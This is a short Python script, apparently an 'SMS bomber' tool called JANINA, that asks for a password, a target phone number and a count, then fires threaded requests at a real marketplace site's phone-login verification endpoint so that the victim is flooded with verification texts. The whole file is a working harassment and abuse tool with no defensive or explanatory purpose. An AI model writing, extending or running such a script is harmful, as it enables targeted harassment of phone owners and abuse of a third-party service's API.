import os, time, threading, requests

# --- Script Config ---
TOOL_NAME = "JANINA"
PASSWORD = "1234"
HEADERS = {'User-Agent': 'Mozilla/5.0'}

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print("\033[1;32m" + r"""      ██╗   █████╗   ███╗  ██╗  ██╗  ███╗  ██╗   █████╗  \n      ██║  ██╔══██╗  ████╗ ██║  ██║  ████╗ ██║  ██╔══██╗ \n      ██║  ███████║  ██╔██╗██║  ██║  ██╔██╗██║  ███████║ \n ██   ██║  ██╔══██║  ██║╚████║  ██║  ██║╚████║  ██╔══██║ \n ╚█████╔╝  ██║  ██║  ██║ ╚███║  ██║  ██║ ╚███║  ██║  ██║ """ + "\n" + "="*60 + "\033[0m")

def security():
    print(f"\033[1;31m[!] {TOOL_NAME} IS PROTECTED\033[0m")
    if input("ENTER PASSWORD: ") != PASSWORD:
        print("Incorrect!"); exit()
    print("\033[1;32m[+] ACCESS GRANTED!\033[0m")

def attack(url):
    try: requests.get(url, headers=HEADERS, timeout=10)
    except: pass

def start():
    banner()
    security()
    target = input("\nTARGET NUMBER: ")
    amount = int(input("AMOUNT: "))
    
    apis = [
        {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + target, "method": "GET"},
    ]

    print("\n[!] Attacking started...")
    for _ in range(amount):
        for api in apis:
            threading.Thread(target=attack, args=(api['url'],)).start()
            time.sleep(0.1)
    print("\n[✔] DONE!")

if __name__ == "__main__":
    start()
